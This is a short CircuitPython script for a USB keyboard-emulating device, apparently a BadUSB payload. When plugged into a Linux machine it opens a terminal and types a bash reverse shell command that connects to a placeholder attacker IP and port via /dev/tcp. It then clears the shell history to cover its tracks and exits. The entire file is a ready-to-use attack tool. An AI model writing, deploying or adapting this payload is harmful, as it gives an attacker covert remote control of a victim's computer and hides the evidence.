import time
import usb_hid
from adafruit_hid.keyboard import Keyboard
from adafruit_hid.keycode import Keycode
from adafruit_hid.keyboard_layout_us import KeyboardLayoutUS

kbd = Keyboard(usb_hid.devices)
layout = KeyboardLayoutUS(kbd)

time.sleep(1)

kbd.press(Keycode.CONTROL, Keycode.ALT)
kbd.press(Keycode.T)
kbd.release_all()
time.sleep(1)

reverse_shell_command = 'bash -c "bash -i >& /dev/tcp/<your-ip>/<your-port> 0>&1 & disown"'
layout.write(f'{reverse_shell_command}' + '\n')


layout.write('history -c\n')
kbd.press(Keycode.ENTER)
kbd.release_all()

layout.write('exit\n')

